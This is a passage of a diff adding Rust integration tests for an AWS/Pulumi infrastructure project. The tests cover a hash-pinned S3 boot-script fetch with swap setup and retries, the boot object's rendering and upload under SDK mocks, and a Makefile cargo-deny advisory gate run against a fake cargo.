+            "swapon --show=NAME --noheadings".to_string(),
+            format!("swapon {sys}/swapfile"),
+            "timeout 60".to_string(),
+            get.clone(),
+        ],
+        "the swap first, then the fetch"
+    );
+    assert_eq!(mode(&w.join("sys/swapfile")), 0o600);
+    let fstab = format!("UUID=0000 / xfs defaults 0 1\n{sys}/swapfile none swap defaults 0 0\n");
+    assert_eq!(text(&w.join("sys/etc/fstab")), fstab, "the swap stays on across a reboot (LD-R57)");
+
+    // Safe to run twice.
+    std::fs::remove_file(w.join("calls")).unwrap();
+    let (code, err) = b.run(right, 0);
+    assert_eq!((code, err.as_str()), (0, ""));
+    assert_eq!(b.marker(), "0022\nran\n0022\nran\n");
+    assert_eq!(b.calls(), ["swapon --show=NAME --noheadings".to_string(), "timeout 60".to_string(), get.clone()], "no second dd, mkswap or swapon");
+    assert_eq!(text(&w.join("sys/etc/fstab")), fstab, "one fstab line");
+
+    // A wrong object: not run, whatever else is on the disk.
+    std::fs::remove_file(w.join("marker")).unwrap();
+    let (code, err) = b.run("echo wrong >> \"$W/marker\"\n", 0);
+    assert_ne!(code, 0, "{err}");
+    assert!(err.contains("has SHA-256 ") && err.contains(", not the pinned ") && err.ends_with(": nothing run\n"), "{err}");
+    assert_eq!(b.marker(), "", "nothing fetched run");
+    let (code, err) = b.run("", 0);
+    assert_ne!(code, 0, "an empty object: {err}");
+    assert_eq!(b.marker(), "");
+
+    // A fetch failing twice, then succeeding.
+    std::fs::remove_file(w.join("calls")).unwrap();
+    let (code, err) = b.run(right, 2);
+    assert_eq!(code, 0, "{err}");
+    assert_eq!(err.matches("Could not connect to the endpoint URL").count(), 2, "{err}");
+    assert_eq!(b.marker(), "0022\nran\n");
+    let calls = b.calls();
+    assert_eq!(calls.iter().filter(|c| **c == get).count(), 3, "{calls:#?}");
+    assert_eq!(calls.iter().filter(|c| *c == "sleep 10").count(), 2, "{calls:#?}");
+
+    // Failing throughout: about 5 minutes, and what an earlier run left is not run.
+    std::fs::remove_file(w.join("marker")).unwrap();
+    std::fs::remove_file(w.join("calls")).unwrap();
+    let start: u64 = text(&w.join("clock")).trim().parse().unwrap();
+    let (code, err) = b.run(right, u32::MAX);
+    assert_ne!(code, 0, "{err}");
+    assert!(err.ends_with(&format!("ai-env-relay-user-data: s3://{BUCKET}/{} could not be fetched in 5 minutes: nothing run\n", b.key())), "{err}");
+    assert_eq!(b.marker(), "", "nothing fetched run, the file of the last run neither");
+    let waited = text(&w.join("clock")).trim().parse::<u64>().unwrap() - start;
+    assert_eq!(waited, 300, "about 5 minutes");
+    assert_eq!(b.calls().iter().filter(|c| **c == get).count(), 31);
+
+    // The object's own failure is the script's.
+    let failing = "exit 7\n";
+    let f = Bootstrap::new(failing);
+    assert_eq!(f.run(failing, 0).0, 7, "the boot script's exit code stops the boot with it");
+}
+
+/// relay.ts's createRelay under the SDK's mocks (`pulumi.runtime.setMocks`): the boot object's inputs, the instance's user
+/// data and which of its dependencies is that object, as one JSON object. Its other resources are what createRelay needs of
+/// the egress side and the artifacts bucket (`ai-env-artifacts-…`, the mock's name for it, `RT_BUCKET`).
+const RELAY_TS_UNDER_MOCKS: &str = r#"const path = require('path');
+const out = process.env.RT_OUT, infra = process.env.RT_INFRA;
+const pulumi = require('@pulumi/pulumi');
+const seen = new Map(), deps = new Map();
+pulumi.runtime.setMocks({
+  newResource: (a) => { seen.set(a.type + '::' + a.name, a.inputs); return { id: a.name + '-id', state: a.type === 'aws:s3/bucket:Bucket' ? { ...a.inputs, bucket: process.env.RT_BUCKET } : a.inputs }; },
+  call: (a) => (a.token.includes('getParameter') ? { insecureValue: 'ami-1', name: a.inputs.name } : a.inputs),
+}, 'ai-env', 'dev', false);
+const monitor = pulumi.runtime.getMonitor(), register = monitor.registerResource.bind(monitor);
+monitor.registerResource = (req, cb) => { deps.set(req.getType() + '::' + req.getName(), req.getDependenciesList()); return register(req, cb); };
+const aws = require('@pulumi/aws');
+const spec = require(path.join(out, 'egress-spec.js'));
+const cfg = spec.loadEgressConfig(path.join(infra, 'egress-config.json'));
+const provider = new aws.Provider('aws-eu-central-1', { region: 'eu-central-1' });
+const opts = { provider };
+const bucket = new aws.s3.Bucket('ai-env-artifacts', {}, opts);
+const artifacts = { bucket, publicAccess: new aws.s3.BucketPublicAccessBlock('ai-env-artifacts', { bucket: bucket.id }, opts) };
+const net = {
+  proxySubnet: { id: pulumi.output('subnet-p') }, relaySecurityGroup: { id: pulumi.output('sg-r') }, relayRules: [],
+  proxyRouteAssociation: new aws.ec2.RouteTableAssociation('rt', { routeTableId: 'r', subnetId: 's' }, opts),
+  dhcpAssociation: new aws.ec2.VpcDhcpOptionsAssociation('dhcp', { vpcId: 'v', dhcpOptionsId: 'o' }, opts),
+  s3Endpoint: new aws.ec2.VpcEndpoint('s3', { vpcId: 'v', serviceName: 's' }, opts),
+};
+const names = pulumi.output({ accountId: '123456789012', region: 'eu-central-1', bucket: process.env.RT_BUCKET, imageName: 'i', logGroup: '/i', egress: spec.egressNames(cfg), transcriptsBucket: 't' });
+const relayJson = { binary: 'b', binaryPath: 'b', uploadPath: path.join(infra, 'package.json'), sha256: 'f'.repeat(64), key: 'relay/ai-env-relay-' + 'f'.repeat(16), version: '0.12.0' };
+const relay = require(path.join(out, 'relay.js')).createRelay(spec.egressSpec(cfg), { track: () => {} }, names, net, artifacts, relayJson, { Project: 'ai-env' }, { aws: provider });
+pulumi.all([relay.instance.id, relay.boot.id]).apply(() => {
+  const instance = 'aws:ec2/instance:Instance::' + spec.NET.relayInstance, object = 'aws:s3/bucketObjectv2:BucketObjectv2::' + spec.NET.relayBoot;
+  console.log(JSON.stringify({ object: seen.get(object), userData: seen.get(instance).userData, replaceOnChange: seen.get(instance).userDataReplaceOnChange,
+    dependsOn: deps.get(instance).filter((u) => u.endsWith('::' + spec.NET.relayBoot)) }));
+  process.exit(0);
+});
+"#;
+
+/// I-T65 (LD-R56): the boot object is the rendered script: the key's hash and the user data's hash are the SHA-256 of the
+/// object's text, as bytes (R's guard.nft holds a `§`), and relay.ts uploads that text under that key (under the SDK's
+/// mocks) with the user data for its bucket. The key is the boot object's shape and not the binary's, under the prefix the
+/// relay role and the S3 endpoint already read: no policy changes (I-T3 pins both documents). The plain text of boot.sh
+/// is what it renders: a change to it, or to what it embeds, changes the key and the hash, so the user data, so the
+/// instance (`userDataReplaceOnChange`).
+#[test]
+fn the_boot_object_is_the_rendered_script() {
+    let r = rendered_relay();
+    let (ud, files) = (r["userData"].as_str().unwrap(), &r["files"]);
+    let boot = files["boot"].as_str().unwrap();
+    assert!(!boot.is_ascii(), "bytes, not characters, are hashed: its text is not ASCII");
+    let sha = hex::encode(Sha256::digest(boot.as_bytes()));
+    let key = format!("relay/ai-env-relay-boot-{}", &sha[..16]);
+    assert_eq!(files["bootSha256"], sha.as_str(), "the hash of the object's text");
+    assert_eq!(files["bootKey"], key.as_str(), "the key of that hash");
+    assert!(ud.contains(&format!(" --key '{key}' ")), "the user data's key: {ud}");
+    assert!(ud.lines().any(|l| l == format!("if [ \"$got\" != '{sha}' ]; then")), "the user data's hash: {ud}");
+    let template = text(&infra().join("relay/boot.sh"));
+    let (head, tail) = template.split_once("@PARAM_PREFIX@").unwrap();
+    assert!(boot.starts_with(head) && boot.ends_with(tail.rsplit_once("@CW_AGENT_JSON@").unwrap().1), "the object is boot.sh rendered");
+
+    // What relay.ts makes of it, under the SDK's own mocks: the object holds that text and that key, in the artifacts
+    // bucket, and nothing else; the instance's user data is the rendering for that bucket, and the instance depends on
+    // the object. Nothing reaches AWS or the Pulumi engine.
+    let mut cmd = Command::new("node");
+    cmd.arg("-e")
+        .arg(RELAY_TS_UNDER_MOCKS)
+        .env("NODE_PATH", infra().join("node_modules"))
+        .env("RT_OUT", compiled_guard())
+        .env("RT_INFRA", infra())
+        .env("RT_BUCKET", BUCKET)
+        .env("AI_ENV_REPO_ROOT", REPO)
+        .stdin(Stdio::null());
+    // Its exit code is the SDK's, which counts the promises a process exiting in mid-program leaves.
+    let o = bounded(&mut cmd, "relay.ts under mocks");
+    let planned: Value = serde_json::from_str(stdout(&o).lines().next().unwrap_or_default()).unwrap_or_else(|e| panic!("no JSON ({e}): {}", all(&o)));
+    assert_eq!(planned["object"], json!({"bucket": "ai-env-artifacts-id", "content": boot, "contentType": "text/x-shellscript", "key": key, "tags": {"Project": "ai-env"}}), "the boot object's inputs, and no other");
+    assert_eq!(planned["userData"], ud, "the instance's user data");
+    assert_eq!(planned["replaceOnChange"], true, "a change to it replaces the instance");
+    assert_eq!(planned["dependsOn"], json!(["urn:pulumi:dev::ai-env::aws:s3/bucketObjectv2:BucketObjectv2::relay-boot"]), "the object exists before the instance that fetches it boots");
+
+    // The sample check-policies.sh simulates against is of the object's shape.
+    let arn = pp(&["--arn", "relay-boot-object"]);
+    let sample = arn.trim().split_once("/").map(|(_, k)| k.to_string()).unwrap_or_default();
+
+    let shapes = node(
+        "console.log(JSON.stringify({ boot: rs.RELAY_BOOT_KEY_RE.test(process.env.RT_KEY), binary: rs.RELAY_KEY_RE.test(process.env.RT_KEY), sample: rs.RELAY_BOOT_KEY_RE.test(process.env.RT_SAMPLE), prefix: pol.RELAY_KEY_PREFIX }));",
+        &[("RT_KEY", &key), ("RT_SAMPLE", &sample)],
+    );
+    assert_eq!(shapes["sample"], true, "{arn}");
+    assert_eq!(shapes["boot"], true, "RELAY_BOOT_KEY_RE");
+    assert_eq!(shapes["binary"], false, "never an artifact: RELAY_KEY_RE and the artifact parameter's rules stay as they are");
+    assert!(key.starts_with(shapes["prefix"].as_str().unwrap()), "under RELAY_KEY_PREFIX");
+    for (name, sid) in [("relay", "ReadRelayArtifact"), ("s3-endpoint", "RelayArtifactOfTheRelayRole")] {
+        let d = document(name);
+        let resources = list(&statement(&d, sid)["Resource"]);
+        assert!(resources.iter().all(|r| r.ends_with("/relay/ai-env-relay-*")), "{name} {sid} covers it: {resources:?}");
+    }
+
+    // Another text: another key and hash, so another user data.
+    let another = node(
+        "const pin = rs.relayBootPin(process.env.RT_BOOT + '# changed\\n'); console.log(JSON.stringify({ pin, userData: rs.renderRelayUserData(process.env.RT_BUCKET, pin, 'eu-central-1', path.join(infra, 'relay')) }));",
+        &[("RT_BOOT", boot), ("RT_BUCKET", BUCKET)],
+    );
+    assert_ne!(another["pin"]["bootKey"], key.as_str());
+    assert_ne!(another["userData"], ud, "a change to the object replaces the instance");
+}
+
+// ---- the advisory gate (R-140) ----
+
+/// The cargo `make check-advisories` runs, faked: logs its arguments to `FAKE_CARGO_LOG`; `deny fetch db` exits
+/// `FAKE_DENY_FETCH_RC` (default 0), either check exits `FAKE_DENY_CHECK_RC` (default 0); anything else exits 2.
+const FAKE_CARGO: &str = r#"#!/bin/sh
+printf '%s\n' "$*" >> "$FAKE_CARGO_LOG"
+case "$*" in
+  "deny fetch db") exit "${FAKE_DENY_FETCH_RC:-0}" ;;
+  "deny --workspace check advisories"|"deny --offline --workspace check advisories") echo "advisories ok"; exit "${FAKE_DENY_CHECK_RC:-0}" ;;
+esac
+echo "fake cargo: unexpected: $*" >&2
+exit 2
+"#;
+
+/// I-T62 (R-140, §RS.4.3): deny.toml holds `[advisories]` with the RustSec database, `yanked = "deny"` and no ignored
+/// advisory, over the graph without all features (and a license `allow` list, for a manual `cargo deny check
+/// licenses`); the Makefile's check-advisories is §RS.4.3's text, and takes its three branches as they read: the
+/// database fetched, the check; not fetched but a copy cached, a note and the check offline; neither, a note and exit 0.
+/// A failed check fails the target, and without cargo-deny it is exit 1 naming its install. Its cargo is
+/// [`FAKE_CARGO`], its HOME the test's: nothing is fetched.
+#[test]
+fn the_advisory_gate_reads_deny_toml() {
+    let deny: toml::Value = toml::from_str(&text(&Path::new(REPO).join("deny.toml"))).expect("deny.toml is TOML");
+    let strings = |v: &toml::Value| v.as_array().map(|a| a.iter().filter_map(toml::Value::as_str).map(str::to_string).collect::<Vec<_>>());
+    assert_eq!(strings(&deny["advisories"]["db-urls"]), Some(vec!["https://github.com/rustsec/advisory-db".to_string()]));
+    assert_eq!(deny["advisories"]["yanked"].as_str(), Some("deny"));
+    assert_eq!(strings(&deny["advisories"]["ignore"]), Some(vec![]), "no advisory ignored");
+    assert_eq!(deny["graph"]["all-features"].as_bool(), Some(false));
+    assert!(strings(&deny["licenses"]["allow"]).is_some_and(|a| a.iter().any(|l| l == "Apache-2.0")), "the workspace's own license allowed");
+    let makefile = text(&Path::new(REPO).join("Makefile"));
+    let rule: Vec<&str> = makefile.lines().skip_while(|l| !l.starts_with("check-advisories:")).take_while(|l| !l.is_empty()).collect();
+    assert_eq!(
+        rule,
+        [
+            "check-advisories: ## E.2: RustSec advisories over the workspace's lock (cargo deny, deny.toml); an unreachable database falls back to the cached copy, else the check is skipped with a note",
+            "\t@command -v cargo-deny >/dev/null || { echo \"cargo install cargo-deny --locked\"; exit 1; }",
+            "\t@if cargo deny fetch db >/dev/null 2>&1; then cargo deny --workspace check advisories; \\",
+            "\telif ls -d \"$$HOME\"/.cargo/advisory-dbs/advisory-db-* >/dev/null 2>&1; then echo \"check-advisories: the RustSec database could not be fetched: checking against the cached copy\"; cargo deny --offline --workspace check advisories; \\",
+            "\telse echo \"check-advisories: skipped: the RustSec database could not be fetched and none is cached\"; fi",
+        ],
+        "§RS.4.3's recipe"
+    );
+
+    let t = tempfile::tempdir().unwrap();
+    let bin = t.path().join("bin");
+    std::fs::create_dir_all(&bin).unwrap();
+    executable(&bin.join("cargo"), FAKE_CARGO);
+    executable(&bin.join("cargo-deny"), "#!/bin/sh\nexit 2\n");
+    let log = t.path().join("cargo.log");
+    let gate = |envs: &[(&str, &str)]| -> (Output, Vec<String>) {
+        let before = text(&log).lines().count();
+        let mut cmd = Command::new("make");
+        isolate(&mut cmd, t.path()).env("PATH", format!("{}:/usr/bin:/bin", bin.display())).env("FAKE_CARGO_LOG", &log).envs(envs.iter().copied());
+        cmd.args(["-s", "--no-print-directory", "-C", REPO, "check-advisories"]);
+        let o = bounded(&mut cmd, "make check-advisories");
+        (o, text(&log).lines().skip(before).map(str::to_string).collect())
+    };
+    let (o, calls) = gate(&[]);
+    assert!(o.status.success() && stdout(&o) == "advisories ok\n", "fetched: {}", all(&o));
+    assert_eq!(calls, ["deny fetch db", "deny --workspace check advisories"]);
+    let (o, calls) = gate(&[("FAKE_DENY_FETCH_RC", "1")]);
+    assert!(o.status.success() && stdout(&o) == "check-advisories: skipped: the RustSec database could not be fetched and none is cached\n", "neither: {}", all(&o));
+    assert_eq!(calls, ["deny fetch db"]);
+    std::fs::create_dir_all(t.path().join(".cargo/advisory-dbs/advisory-db-0123456789abcdef")).unwrap();
+    let (o, calls) = gate(&[("FAKE_DENY_FETCH_RC", "1")]);
+    assert!(o.status.success() && stdout(&o) == "check-advisories: the RustSec database could not be fetched: checking against the cached copy\nadvisories ok\n", "cached: {}", all(&o));
+    assert_eq!(calls, ["deny fetch db", "deny --offline --workspace check advisories"]);
+    for envs in [vec![("FAKE_DENY_CHECK_RC", "1")], vec![("FAKE_DENY_FETCH_RC", "1"), ("FAKE_DENY_CHECK_RC", "1")]] {
+        let (o, calls) = gate(&envs);
+        assert!(!o.status.success() && calls.len() == 2, "{envs:?}: a failed check fails the target: {}", all(&o));
+    }
+    std::fs::remove_file(bin.join("cargo-deny")).unwrap();
+    let (o, calls) = gate(&[]);
+    assert!(!o.status.success() && stdout(&o) == "cargo install cargo-deny --locked\n", "no cargo-deny: {}", all(&o));
+    assert!(calls.is_empty(), "{calls:?}");
 }
